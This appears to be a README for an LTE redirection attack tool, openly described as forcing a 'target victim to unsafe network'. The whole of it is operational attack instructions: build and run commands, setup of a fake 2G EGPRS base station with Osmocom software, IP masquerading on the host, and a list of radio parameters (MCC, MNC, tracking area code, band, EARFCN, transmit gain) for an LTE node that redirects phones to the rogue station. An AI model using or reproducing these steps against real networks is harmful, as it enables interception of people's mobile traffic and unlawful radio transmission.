# LTE-Redirection_Attack
Force target victim to unsafe network

## Build

```bash
sudo ./build.sh
```


## Run

```bash
sudo ./run.sh
```

2G EGPRS Fake base Station :

In Osmocom Popped Terminal (change MCC//MNC accordingly in osmo-bsc.cfg osmo-bsc.cfg)

```bash
./tun.sh
./osmo-all.sh
osmo-trx-uhd
```

Forward your ip in host terminal:
```bash
./srsepc_if_masq.sh your_interface
```


LTE Node redirector

```bash
write mcc (replace)
write mnc (relace)
wirte tracking_area_code (replace)
write mcc (replace)
write mnc (replace)
write band (replace)
write dl_earfcn (replace)
write tx_gain 80
write rx_gain 30
start
``` 
